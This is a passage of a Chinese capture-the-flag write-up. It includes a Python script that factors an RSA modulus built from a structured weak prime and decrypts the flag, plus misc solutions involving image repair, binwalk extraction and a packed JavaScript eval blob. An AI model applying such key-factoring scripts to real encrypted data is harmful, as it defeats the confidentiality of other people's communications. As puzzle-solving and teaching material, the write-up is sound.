class="token number">233</span><span class="token punctuation">,</span> <span class="token number">239</span><span class="token punctuation">,</span> <span class="token number">241</span><span class="token punctuation">,</span> <span class="token number">251</span><span class="token punctuation">,</span> <span class="token number">257</span><span class="token punctuation">,</span> <span class="token number">263</span><span class="token punctuation">,</span> <span class="token number">269</span><span class="token punctuation">,</span> <span class="token number">271</span><span class="token punctuation">,</span> <span class="token number">277</span><span class="token punctuation">,</span> <span class="token number">281</span><span class="token punctuation">,</span> <span class="token number">283</span><span class="token punctuation">,</span> <span class="token number">293</span><span class="token punctuation">,</span> <span class="token number">307</span><span class="token punctuation">,</span> <span class="token number">311</span><span class="token punctuation">,</span> <span class="token number">313</span><span class="token punctuation">,</span> <span class="token number">317</span><span class="token punctuation">,</span> <span class="token number">331</span><span class="token punctuation">,</span> <span class="token number">337</span><span class="token punctuation">,</span> <span class="token number">347</span><span class="token punctuation">,</span> <span class="token number">349</span><span class="token punctuation">,</span> <span class="token number">353</span><span class="token punctuation">,</span> <span class="token number">359</span><span class="token punctuation">,</span> <span class="token number">367</span><span class="token punctuation">,</span> <span class="token number">373</span><span class="token punctuation">,</span> <span class="token number">379</span><span class="token punctuation">,</span> <span class="token number">383</span><span class="token punctuation">,</span> <span class="token number">389</span><span class="token punctuation">,</span> <span class="token number">397</span><span class="token punctuation">,</span> <span class="token number">401</span><span class="token punctuation">,</span> <span class="token number">409</span><span class="token punctuation">,</span> <span class="token number">419</span><span class="token punctuation">,</span> <span class="token number">421</span><span class="token punctuation">,</span> <span class="token number">431</span><span class="token punctuation">,</span> <span class="token number">433</span><span class="token punctuation">,</span> <span class="token number">439</span><span class="token punctuation">,</span> <span class="token number">443</span><span class="token punctuation">,</span> <span class="token number">449</span><span class="token punctuation">,</span> <span class="token number">457</span><span class="token punctuation">,</span> <span class="token number">461</span><span class="token punctuation">,</span> <span class="token number">463</span><span class="token punctuation">,</span> <span class="token number">467</span><span class="token punctuation">,</span> <span class="token number">479</span><span class="token punctuation">,</span> <span class="token number">487</span><span class="token punctuation">,</span> <span class="token number">491</span><span class="token punctuation">,</span> <span class="token number">499</span><span class="token punctuation">,</span> <span class="token number">503</span><span class="token punctuation">,</span> <span class="token number">509</span><span class="token punctuation">,</span> <span class="token number">521</span><span class="token punctuation">,</span> <span class="token number">523</span><span class="token punctuation">,</span> <span class="token number">541</span><span class="token punctuation">,</span> <span class="token number">547</span><span class="token punctuation">,</span> <span class="token number">557</span><span class="token punctuation">,</span> <span class="token number">563</span><span class="token punctuation">,</span> <span class="token number">569</span><span class="token punctuation">,</span> <span class="token number">571</span><span class="token punctuation">,</span> <span class="token number">577</span><span class="token punctuation">,</span> <span class="token number">587</span><span class="token punctuation">,</span> <span class="token number">593</span><span class="token punctuation">,</span> <span class="token number">599</span><span class="token punctuation">,</span> <span class="token number">601</span><span class="token punctuation">,</span> <span class="token number">607</span><span class="token punctuation">,</span> <span class="token number">613</span><span class="token punctuation">,</span> <span class="token number">617</span><span class="token punctuation">,</span> <span class="token number">619</span><span class="token punctuation">,</span> <span class="token number">631</span><span class="token punctuation">,</span> <span class="token number">641</span><span class="token punctuation">,</span> <span class="token number">643</span><span class="token punctuation">,</span> <span class="token number">647</span><span class="token punctuation">,</span> <span class="token number">653</span><span class="token punctuation">,</span> <span class="token number">659</span><span class="token punctuation">,</span> <span class="token number">661</span><span class="token punctuation">,</span> <span class="token number">673</span><span class="token punctuation">,</span> <span class="token number">677</span><span class="token punctuation">,</span> <span class="token number">683</span><span class="token punctuation">,</span> <span class="token number">691</span><span class="token punctuation">,</span> <span class="token number">701</span><span class="token punctuation">,</span> <span class="token number">709</span><span class="token punctuation">,</span> <span class="token number">719</span><span class="token punctuation">,</span> <span class="token number">727</span><span class="token punctuation">,</span> <span class="token number">733</span><span class="token punctuation">,</span> <span class="token number">739</span><span class="token punctuation">,</span> <span class="token number">743</span><span class="token punctuation">,</span> <span class="token number">751</span><span class="token punctuation">,</span> <span class="token number">757</span><span class="token punctuation">,</span> <span class="token number">761</span><span class="token punctuation">,</span> <span class="token number">769</span><span class="token punctuation">,</span> <span class="token number">773</span><span class="token punctuation">,</span> <span class="token number">787</span><span class="token punctuation">,</span> <span class="token number">797</span><span class="token punctuation">,</span> <span class="token number">809</span><span class="token punctuation">,</span> <span class="token number">811</span><span class="token punctuation">,</span> <span class="token number">821</span><span class="token punctuation">,</span> <span class="token number">823</span><span class="token punctuation">,</span> <span class="token number">827</span><span class="token punctuation">,</span> <span class="token number">829</span><span class="token punctuation">,</span> <span class="token number">839</span><span class="token punctuation">,</span> <span class="token number">853</span><span class="token punctuation">,</span> <span class="token number">857</span><span class="token punctuation">,</span> <span class="token number">859</span><span class="token punctuation">,</span> <span class="token number">863</span><span class="token punctuation">,</span> <span class="token number">877</span><span class="token punctuation">,</span> <span class="token number">881</span><span class="token punctuation">,</span> <span class="token number">883</span><span class="token punctuation">,</span> <span class="token number">887</span><span class="token punctuation">,</span> <span class="token number">907</span><span class="token punctuation">,</span> <span class="token number">911</span><span class="token punctuation">,</span> <span class="token number">919</span><span class="token punctuation">,</span> <span class="token number">929</span><span class="token punctuation">,</span> <span class="token number">937</span><span class="token punctuation">,</span> <span class="token number">941</span><span class="token punctuation">,</span> <span class="token number">947</span><span class="token punctuation">,</span> <span class="token number">953</span><span class="token punctuation">,</span> <span class="token number">967</span><span class="token punctuation">,</span> <span class="token number">971</span><span class="token punctuation">,</span> <span class="token number">977</span><span class="token punctuation">,</span> <span class="token number">983</span><span class="token punctuation">,</span> <span class="token number">991</span><span class="token punctuation">,</span> <span class="token number">997</span><span class="token punctuation">,</span> <span class="token number">1009</span><span class="token punctuation">,</span> <span class="token number">1013</span><span class="token punctuation">,</span> <span class="token number">1019</span><span class="token punctuation">,</span> <span class="token number">1021</span><span class="token punctuation">,</span> <span class="token number">1031</span><span class="token punctuation">,</span> <span class="token number">1033</span><span class="token punctuation">,</span> <span class="token number">1039</span><span class="token punctuation">,</span> <span class="token number">1049</span><span class="token punctuation">,</span> <span class="token number">1051</span><span class="token punctuation">,</span> <span class="token number">1061</span><span class="token punctuation">,</span> <span class="token number">1063</span><span class="token punctuation">,</span> <span class="token number">1069</span><span class="token punctuation">,</span> <span class="token number">1087</span><span class="token punctuation">,</span> <span class="token number">1091</span><span class="token punctuation">,</span> <span class="token number">1093</span><span class="token punctuation">,</span> <span class="token number">1097</span><span class="token punctuation">,</span> <span class="token number">1103</span><span class="token punctuation">,</span> <span class="token number">1109</span><span class="token punctuation">,</span> <span class="token number">1117</span><span class="token punctuation">,</span> <span class="token number">1123</span><span class="token punctuation">,</span> <span class="token number">1129</span><span class="token punctuation">,</span> <span class="token number">1151</span><span class="token punctuation">,</span> <span class="token number">1153</span><span class="token punctuation">,</span> <span class="token number">1163</span><span class="token punctuation">,</span> <span class="token number">1171</span><span class="token punctuation">,</span> <span class="token number">1181</span><span class="token punctuation">,</span> <span class="token number">1187</span><span class="token punctuation">,</span> <span class="token number">1193</span><span class="token punctuation">,</span> <span class="token number">1201</span><span class="token punctuation">,</span> <span class="token number">1213</span><span class="token punctuation">,</span> <span class="token number">1217</span><span class="token punctuation">,</span> <span class="token number">1223</span><span class="token punctuation">,</span> <span class="token number">1229</span><span class="token punctuation">,</span> <span class="token number">1231</span><span class="token punctuation">,</span> <span class="token number">1237</span><span class="token punctuation">,</span> <span class="token number">1249</span><span class="token punctuation">,</span> <span class="token number">1259</span><span class="token punctuation">,</span> <span class="token number">1277</span><span class="token punctuation">,</span> <span class="token number">1279</span><span class="token punctuation">,</span> <span class="token number">1283</span><span class="token punctuation">,</span> <span class="token number">1289</span><span class="token punctuation">,</span> <span class="token number">1291</span><span class="token punctuation">,</span> <span class="token number">1297</span><span class="token punctuation">,</span> <span class="token number">1301</span><span class="token punctuation">,</span> <span class="token number">1303</span><span class="token punctuation">,</span> <span class="token number">1307</span><span class="token punctuation">,</span> <span class="token number">1319</span><span class="token punctuation">,</span> <span class="token number">1321</span><span class="token punctuation">,</span> <span class="token number">1327</span><span class="token punctuation">,</span> <span class="token number">1361</span><span class="token punctuation">,</span> <span class="token number">1367</span><span class="token punctuation">,</span> <span class="token number">1373</span><span class="token punctuation">,</span> <span class="token number">1381</span><span class="token punctuation">,</span> <span class="token number">1399</span><span class="token punctuation">,</span> <span class="token number">1409</span><span class="token punctuation">,</span> <span class="token number">1423</span><span class="token punctuation">,</span> <span class="token number">1427</span><span class="token punctuation">,</span> <span class="token number">1429</span><span class="token punctuation">,</span> <span class="token number">1433</span><span class="token punctuation">,</span> <span class="token number">1439</span><span class="token punctuation">,</span> <span class="token number">1447</span><span class="token punctuation">,</span> <span class="token number">1451</span><span class="token punctuation">,</span> <span class="token number">1453</span><span class="token punctuation">,</span> <span class="token number">1459</span><span class="token punctuation">,</span> <span class="token number">1471</span><span class="token punctuation">,</span> <span class="token number">1481</span><span class="token punctuation">,</span> <span class="token number">1483</span><span class="token punctuation">,</span> <span class="token number">1487</span><span class="token punctuation">,</span> <span class="token number">1489</span><span class="token punctuation">,</span> <span class="token number">1493</span><span class="token punctuation">,</span> <span class="token number">1499</span><span class="token punctuation">,</span> <span class="token number">1511</span><span class="token punctuation">,</span> <span class="token number">1523</span><span class="token punctuation">,</span> <span class="token number">1531</span><span class="token punctuation">,</span> <span class="token number">1543</span><span class="token punctuation">,</span> <span class="token number">1549</span><span class="token punctuation">,</span> <span class="token number">1553</span><span class="token punctuation">,</span> <span class="token number">1559</span><span class="token punctuation">,</span> <span class="token number">1567</span><span class="token punctuation">,</span> <span class="token number">1571</span><span class="token punctuation">,</span> <span class="token number">1579</span><span class="token punctuation">,</span> <span class="token number">1583</span><span class="token punctuation">,</span> <span class="token number">1597</span><span class="token punctuation">,</span> <span class="token number">1601</span><span class="token punctuation">,</span> <span class="token number">1607</span><span class="token punctuation">,</span> <span class="token number">1609</span><span class="token punctuation">,</span> <span class="token number">1613</span><span class="token punctuation">,</span> <span class="token number">1619</span><span class="token punctuation">,</span> <span class="token number">1621</span><span class="token punctuation">,</span> <span class="token number">1627</span><span class="token punctuation">,</span> <span class="token number">1637</span><span class="token punctuation">,</span> <span class="token number">1657</span><span class="token punctuation">,</span> <span class="token number">1663</span><span class="token punctuation">,</span> <span class="token number">1667</span><span class="token punctuation">,</span> <span class="token number">1669</span><span class="token punctuation">,</span> <span class="token number">1693</span><span class="token punctuation">,</span> <span class="token number">1697</span><span class="token punctuation">,</span> <span class="token number">1699</span><span class="token punctuation">,</span> <span class="token number">1709</span><span class="token punctuation">,</span> <span class="token number">1721</span><span class="token punctuation">,</span> <span class="token number">1723</span><span class="token punctuation">,</span> <span class="token number">1733</span><span class="token punctuation">,</span> <span class="token number">1741</span><span class="token punctuation">,</span> <span class="token number">1747</span><span class="token punctuation">,</span> <span class="token number">1753</span><span class="token punctuation">,</span> <span class="token number">1759</span><span class="token punctuation">,</span> <span class="token number">1777</span><span class="token punctuation">,</span> <span class="token number">1783</span><span class="token punctuation">,</span> <span class="token number">1787</span><span class="token punctuation">,</span> <span class="token number">1789</span><span class="token punctuation">,</span> <span class="token number">1801</span><span class="token punctuation">,</span> <span class="token number">1811</span><span class="token punctuation">,</span> <span class="token number">1823</span><span class="token punctuation">,</span> <span class="token number">1831</span><span class="token punctuation">,</span> <span class="token number">1847</span><span class="token punctuation">,</span> <span class="token number">1861</span><span class="token punctuation">,</span> <span class="token number">1867</span><span class="token punctuation">,</span> <span class="token number">1871</span><span class="token punctuation">,</span> <span class="token number">1873</span><span class="token punctuation">,</span> <span class="token number">1877</span><span class="token punctuation">,</span> <span class="token number">1879</span><span class="token punctuation">,</span> <span class="token number">1889</span><span class="token punctuation">,</span> <span class="token number">1901</span><span class="token punctuation">,</span> <span class="token number">1907</span><span class="token punctuation">,</span> <span class="token number">1913</span><span class="token punctuation">,</span> <span class="token number">1931</span><span class="token punctuation">,</span> <span class="token number">1933</span><span class="token punctuation">,</span> <span class="token number">1949</span><span class="token punctuation">,</span> <span class="token number">1951</span><span class="token punctuation">,</span> <span class="token number">1973</span><span class="token punctuation">,</span> <span class="token number">1979</span><span class="token punctuation">,</span> <span class="token number">1987</span><span class="token punctuation">,</span> <span class="token number">1993</span><span class="token punctuation">,</span> <span class="token number">1997</span><span class="token punctuation">,</span> <span class="token number">1999</span><span class="token punctuation">,</span> <span class="token number">2003</span><span class="token punctuation">,</span> <span class="token number">2011</span><span class="token punctuation">,</span> <span class="token number">2017</span><span class="token punctuation">,</span> <span class="token number">2027</span><span class="token punctuation">,</span> <span class="token number">2029</span><span class="token punctuation">,</span> <span class="token number">2039</span><span class="token punctuation">,</span> <span class="token number">2053</span><span class="token punctuation">,</span> <span class="token number">2063</span><span class="token punctuation">,</span> <span class="token number">2069</span><span class="token punctuation">,</span> <span class="token number">2081</span><span class="token punctuation">,</span> <span class="token number">2083</span><span class="token punctuation">,</span> <span class="token number">2087</span><span class="token punctuation">,</span> <span class="token number">2089</span><span class="token punctuation">,</span> <span class="token number">2099</span><span class="token punctuation">,</span> <span class="token number">2111</span><span class="token punctuation">,</span> <span class="token number">2113</span><span class="token punctuation">,</span> <span class="token number">2129</span><span class="token punctuation">,</span> <span class="token number">2131</span><span class="token punctuation">,</span> <span class="token number">2137</span><span class="token punctuation">,</span> <span class="token number">2141</span><span class="token punctuation">,</span> <span class="token number">2143</span><span class="token punctuation">,</span> <span class="token number">2153</span><span class="token punctuation">,</span> <span class="token number">2161</span><span class="token punctuation">,</span> <span class="token number">2179</span><span class="token punctuation">,</span> <span class="token number">2203</span><span class="token punctuation">,</span> <span class="token number">2207</span><span class="token punctuation">,</span> <span class="token number">2213</span><span class="token punctuation">,</span> <span class="token number">2221</span><span class="token punctuation">,</span> <span class="token number">2237</span><span class="token punctuation">,</span> <span class="token number">2239</span><span class="token punctuation">,</span> <span class="token number">2243</span><span class="token punctuation">,</span> <span class="token number">2251</span><span class="token punctuation">,</span> <span class="token number">2267</span><span class="token punctuation">,</span> <span class="token number">2269</span><span class="token punctuation">,</span> <span class="token number">2273</span><span class="token punctuation">,</span> <span class="token number">2281</span><span class="token punctuation">,</span> <span class="token number">2287</span><span class="token punctuation">,</span> <span class="token number">2293</span><span class="token punctuation">,</span> <span class="token number">2297</span><span class="token punctuation">,</span> <span class="token number">2309</span><span class="token punctuation">,</span> <span class="token number">2311</span><span class="token punctuation">,</span> <span class="token number">2333</span><span class="token punctuation">,</span> <span class="token number">2339</span><span class="token punctuation">,</span> <span class="token number">2341</span><span class="token punctuation">,</span> <span class="token number">2347</span><span class="token punctuation">,</span> <span class="token number">2351</span><span class="token punctuation">,</span> <span class="token number">2357</span><span class="token punctuation">,</span> <span class="token number">2371</span><span class="token punctuation">,</span> <span class="token number">2377</span><span class="token punctuation">,</span> <span class="token number">2381</span><span class="token punctuation">,</span> <span class="token number">2383</span><span class="token punctuation">,</span> <span class="token number">2389</span><span class="token punctuation">,</span> <span class="token number">2393</span><span class="token punctuation">,</span> <span class="token number">2399</span><span class="token punctuation">,</span> <span class="token number">2411</span><span class="token punctuation">,</span> <span class="token number">2417</span><span class="token punctuation">,</span> <span class="token number">2423</span><span class="token punctuation">,</span> <span class="token number">2437</span><span class="token punctuation">,</span> <span class="token number">2441</span><span class="token punctuation">,</span> <span class="token number">2447</span><span class="token punctuation">,</span> <span class="token number">2459</span><span class="token punctuation">,</span> <span class="token number">2467</span><span class="token punctuation">,</span> <span class="token number">2473</span><span class="token punctuation">,</span> <span class="token number">2477</span><span class="token punctuation">,</span> <span class="token number">2503</span><span class="token punctuation">,</span> <span class="token number">2521</span><span class="token punctuation">,</span> <span class="token number">2531</span><span class="token punctuation">,</span> <span class="token number">2539</span><span class="token punctuation">,</span> <span class="token number">2543</span><span class="token punctuation">,</span> <span class="token number">2549</span><span class="token punctuation">,</span> <span class="token number">2551</span><span class="token punctuation">,</span> <span class="token number">2557</span><span class="token punctuation">,</span> <span class="token number">2579</span><span class="token punctuation">,</span> <span class="token number">2591</span><span class="token punctuation">,</span> <span class="token number">2593</span><span class="token punctuation">,</span> <span class="token number">2609</span><span class="token punctuation">,</span> <span class="token number">2617</span><span class="token punctuation">,</span> <span class="token number">2621</span><span class="token punctuation">,</span> <span class="token number">2633</span><span class="token punctuation">,</span> <span class="token number">2647</span><span class="token punctuation">,</span> <span class="token number">2657</span><span class="token punctuation">,</span> <span class="token number">2659</span><span class="token punctuation">,</span> <span class="token number">2663</span><span class="token punctuation">,</span> <span class="token number">2671</span><span class="token punctuation">,</span> <span class="token number">2677</span><span class="token punctuation">,</span> <span class="token number">2683</span><span class="token punctuation">,</span> <span class="token number">2687</span><span class="token punctuation">,</span> <span class="token number">2689</span><span class="token punctuation">,</span> <span class="token number">2693</span><span class="token punctuation">,</span> <span class="token number">2699</span><span class="token punctuation">,</span> <span class="token number">2707</span><span class="token punctuation">,</span> <span class="token number">2711</span><span class="token punctuation">,</span> <span class="token number">2713</span><span class="token punctuation">,</span> <span class="token number">2719</span><span class="token punctuation">,</span> <span class="token number">2729</span><span class="token punctuation">,</span> <span class="token number">2731</span><span class="token punctuation">,</span> <span class="token number">2741</span><span class="token punctuation">,</span> <span class="token number">2749</span><span class="token punctuation">,</span> <span class="token number">2753</span><span class="token punctuation">,</span> <span class="token number">2767</span><span class="token punctuation">,</span> <span class="token number">2777</span><span class="token punctuation">,</span> <span class="token number">2789</span><span class="token punctuation">,</span> <span class="token number">2791</span><span class="token punctuation">,</span> <span class="token number">2797</span><span class="token punctuation">,</span> <span class="token number">2801</span><span class="token punctuation">,</span> <span class="token number">2803</span><span class="token punctuation">,</span> <span class="token number">2819</span><span class="token punctuation">,</span> <span class="token number">2833</span><span class="token punctuation">,</span> <span class="token number">2837</span><span class="token punctuation">,</span> <span class="token number">2843</span><span class="token punctuation">,</span> <span class="token number">2851</span><span class="token punctuation">,</span> <span class="token number">2857</span><span class="token punctuation">,</span> <span class="token number">2861</span><span class="token punctuation">,</span> <span class="token number">2879</span><span class="token punctuation">,</span> <span class="token number">2887</span><span class="token punctuation">,</span> <span class="token number">2897</span><span class="token punctuation">,</span> <span class="token number">2903</span><span class="token punctuation">,</span> <span class="token number">2909</span><span class="token punctuation">,</span> <span class="token number">2917</span><span class="token punctuation">,</span> <span class="token number">2927</span><span class="token punctuation">,</span> <span class="token number">2939</span><span class="token punctuation">,</span> <span class="token number">2953</span><span class="token punctuation">,</span> <span class="token number">2957</span><span class="token punctuation">,</span> <span class="token number">2963</span><span class="token punctuation">,</span> <span class="token number">2969</span><span class="token punctuation">,</span> <span class="token number">2971</span><span class="token punctuation">,</span> <span class="token number">2999</span><span class="token punctuation">]</span></pre></td></tr><tr><td data-num="9"></td><td><pre></pre></td></tr><tr><td data-num="10"></td><td><pre><span class="token keyword">for</span> x <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> vals<span class="token punctuation">)</span><span class="token punctuation">:</span></pre></td></tr><tr><td data-num="11"></td><td><pre>    M<span class="token operator">=</span>M<span class="token operator">*</span>primes<span class="token punctuation">[</span>x<span class="token punctuation">]</span></pre></td></tr><tr><td data-num="12"></td><td><pre></pre></td></tr><tr><td data-num="13"></td><td><pre>p<span class="token operator">=</span>k<span class="token operator">*</span>M<span class="token operator">+</span><span class="token punctuation">(</span><span class="token number">65537</span><span class="token operator">**</span>a <span class="token operator">%</span>M<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="14"></td><td><pre><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'k='</span><span class="token punctuation">,</span>k<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="15"></td><td><pre><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'a='</span><span class="token punctuation">,</span>a<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="16"></td><td><pre><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'Number of prime numbers used='</span><span class="token punctuation">,</span>vals<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="17"></td><td><pre><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'======'</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="18"></td><td><pre></pre></td></tr><tr><td data-num="19"></td><td><pre><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'M='</span><span class="token punctuation">,</span>M<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="20"></td><td><pre><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'\nPrime='</span><span class="token punctuation">,</span>p<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="21"></td><td><pre></pre></td></tr><tr><td data-num="22"></td><td><pre>isp <span class="token operator">=</span> number<span class="token punctuation">.</span>isPrime<span class="token punctuation">(</span>p<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="23"></td><td><pre><span class="token keyword">if</span> <span class="token punctuation">(</span>isp<span class="token operator">==</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">:</span></pre></td></tr><tr><td data-num="24"></td><td><pre>	<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'Value is prime'</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="25"></td><td><pre><span class="token keyword">else</span><span class="token punctuation">:</span></pre></td></tr><tr><td data-num="26"></td><td><pre>	<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'Value is not prime'</span><span class="token punctuation">)</span></pre></td></tr></table></figure><p>通过 pub.pwm 来获取 e 和 n</p><figure class="highlight python"><figcaption data-lang="python"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token keyword">with</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">'./pub.pem'</span> <span class="token punctuation">,</span><span class="token string">'r'</span><span class="token punctuation">)</span> <span class="token keyword">as</span> f<span class="token punctuation">:</span></pre></td></tr><tr><td data-num="2"></td><td><pre>    key <span class="token operator">=</span> RSA<span class="token punctuation">.</span>import_key<span class="token punctuation">(</span>f<span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="3"></td><td><pre>    e <span class="token operator">=</span> key<span class="token punctuation">.</span>e</pre></td></tr><tr><td data-num="4"></td><td><pre>    n <span class="token operator">=</span> key<span class="token punctuation">.</span>n</pre></td></tr><tr><td data-num="5"></td><td><pre><span class="token comment">#e=65535</span></pre></td></tr><tr><td data-num="6"></td><td><pre><span class="token comment">#n=15518961041625074876182404585394098781487141059285455927024321276783831122168745076359780343078011216480587575072479784829258678691739</span></pre></td></tr></table></figure><p>这里的 n 是 134 位，预估 p 的位数不超过 134/2=67 位，M 代表前 x 项素数的乘积， x 的可选值有 5，16，39，71，80，126。在参数 k 与 a 取值不大的情况下，选取不同的 x 值，得到的 p 的位数不同。</p><p><img data-src="https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/202304041614575.png" alt="image-20230404161441453"></p><p>这里爆破一下求得 pq</p><pre><code>import gmpy2
M=962947420735983927056946215901134429196419130606213075415963491270
n=15518961041625074876182404585394098781487141059285455927024321276783831122168745076359780343078011216480587575072479784829258678691739

for k in range(100):
	for a in range(100):
		p=k*M+(65537**a %M)
		if n%p==0:
			print('k=',k)
			print('a=',a)
			print('Prime=',p)
			isp = gmpy2.is_prime(p)
</code></pre><p><img data-src="https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/202304041616242.png" alt="image-20230404161647184"></p><figure class="highlight python"><figcaption data-lang="python"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token keyword">from</span> gmpy2 <span class="token keyword">import</span> <span class="token operator">*</span></pre></td></tr><tr><td data-num="2"></td><td><pre><span class="token keyword">import</span> libnum</pre></td></tr><tr><td data-num="3"></td><td><pre></pre></td></tr><tr><td data-num="4"></td><td><pre>n <span class="token operator">=</span> <span class="token number">15518961041625074876182404585394098781487141059285455927024321276783831122168745076359780343078011216480587575072479784829258678691739</span></pre></td></tr><tr><td data-num="5"></td><td><pre>e <span class="token operator">=</span> <span class="token number">65537</span></pre></td></tr><tr><td data-num="6"></td><td><pre>p <span class="token operator">=</span> <span class="token number">3386619977051114637303328519173627165817832179845212640767197001941</span></pre></td></tr><tr><td data-num="7"></td><td><pre>q <span class="token operator">=</span> <span class="token number">4582433561127855310805294456657993281782662645116543024537051682479</span></pre></td></tr><tr><td data-num="8"></td><td><pre>c <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">(</span><span class="token string">"02142af7ce70fe0ddae116bb7e96260274ee9252a8cb528e7fdd29809c2a6032727c05526133ae4610ed944572ff1abfcd0b17aa22ef44a2"</span><span class="token punctuation">,</span><span class="token number">16</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="9"></td><td><pre></pre></td></tr><tr><td data-num="10"></td><td><pre>N <span class="token operator">=</span> <span class="token punctuation">(</span>p<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token punctuation">(</span>q<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="11"></td><td><pre>d <span class="token operator">=</span> invert<span class="token punctuation">(</span>e<span class="token punctuation">,</span>N<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="12"></td><td><pre>m <span class="token operator">=</span> <span class="token builtin">pow</span><span class="token punctuation">(</span>c<span class="token punctuation">,</span>d<span class="token punctuation">,</span>n<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="13"></td><td><pre><span class="token comment"># print(d)</span></pre></td></tr><tr><td data-num="14"></td><td><pre><span class="token keyword">print</span><span class="token punctuation">(</span>libnum<span class="token punctuation">.</span>n2s<span class="token punctuation">(</span><span class="token builtin">int</span><span class="token punctuation">(</span>m<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="15"></td><td><pre><span class="token comment">#b'flag&#123;760958c9-cca9-458b-9cbe-ea07aa1668e4&#125;'</span></pre></td></tr></table></figure><h2 id="misc"><a class="anchor" href="#misc">#</a> Misc</h2><h3 id="pokémon"><a class="anchor" href="#pokémon">#</a> Pokémon</h3><p><span class="exturl" data-url="aHR0cHM6Ly93d3cuZW11bGF0b3Item9uZS5jb20vZG9jLnBocC9nYmEvdmJveWFkdmFuY2UuaHRtbA==">Visual Boy Advance (emulator-zone.com)</span></p><p>玩这个游戏，到 103 号路口就行，纯娱乐</p><h3 id="code-obfuscation"><a class="anchor" href="#code-obfuscation">#</a> code obfuscation</h3><p><img data-src="https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/202304041752507.png" alt="image-20230404175252420"></p><p>将图片拉伸一下</p><p><img data-src="https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/202304041753123.png" alt="image-20230404175317080"></p><p>补一下这个图</p><p><img data-src="https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/202304041756324.png" alt="image-20230404175641276"></p><p><img data-src="https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/202304041757333.png" alt="image-20230404175700284"></p><p>这里用 binwalk -e 分解后得到一个 rar</p><p>将上面 gkctf 进行 base58 编码后可以打开压缩包</p><p>打开后图片内容</p><figure class="highlight perl"><figcaption data-lang="perl"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token variable">$Bn$Ai$An$Ac$Al$Au$Ad$Ae$Bk$Cc$As$At$Ad$Ai$Ao$By$Ah$Ce</span></pre></td></tr><tr><td data-num="2"></td><td><pre><span class="token variable">$Ai$An$At$Bk$Am$Aa$Ai$Bs$Bt$Cn</span></pre></td></tr><tr><td data-num="3"></td><td><pre><span class="token variable">$Ap$Ar$Ai$An$At$Bs$Bm$Aw$Dd$Al$Ac$Da$Am$Ae$Cl$De$Ao$Cl$Dj$Ak$Ac$At$Df$Bm$Bt$Cb</span></pre></td></tr><tr><td data-num="4"></td><td><pre><span class="token variable">$Ar$Ae$At$Au$Ar$An$Bk$Da$Cb</span></pre></td></tr><tr><td data-num="5"></td><td><pre><span class="token variable">$Cp</span></pre></td></tr></table></figure><p>1 文件内容</p><figure class="highlight perl"><figcaption data-lang="perl"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token keyword">eval</span><span class="token punctuation">(</span>function<span class="token punctuation">(</span>p<span class="token punctuation">,</span>a<span class="token punctuation">,</span>c<span class="token punctuation">,</span>k<span class="token punctuation">,</span>e<span class="token punctuation">,</span>d<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>e<span class="token operator">=</span>function<span class="token punctuation">(</span>c<span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token keyword">return</span><span class="token punctuation">(</span>c<span class="token operator">&lt;</span>a<span class="token operator">?</span><span class="token string">""</span><span class="token punctuation">:</span>e<span class="token punctuation">(</span>parseInt<span class="token punctuation">(</span>c<span class="token regex">/a)))+((c=c%a)>35?String.fromCharCode(c+29):c.toString(36))&#125;;if(!''.replace(/</span><span class="token operator">^</span><span class="token operator">/</span><span class="token punctuation">,</span>String<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token keyword">while</span><span class="token punctuation">(</span>c<span class="token operator">--</span><span class="token punctuation">)</span>d<span class="token punctuation">[</span>e<span class="token punctuation">(</span>c<span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token operator">=</span>k<span class="token punctuation">[</span>c<span class="token punctuation">]</span><span class="token operator">||</span>e<span class="token punctuation">(</span>c<span class="token punctuation">)</span><span class="token punctuation">;</span>k<span class="token operator">=</span><span class="token punctuation">[</span>function<span class="token punctuation">(</span>e<span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token keyword">return</span> d<span class="token punctuation">[</span>e<span class="token punctuation">]</span><span class="token punctuation">&#125;</span><span class="token punctuation">]</span><span class="token punctuation">;</span>e<span class="token 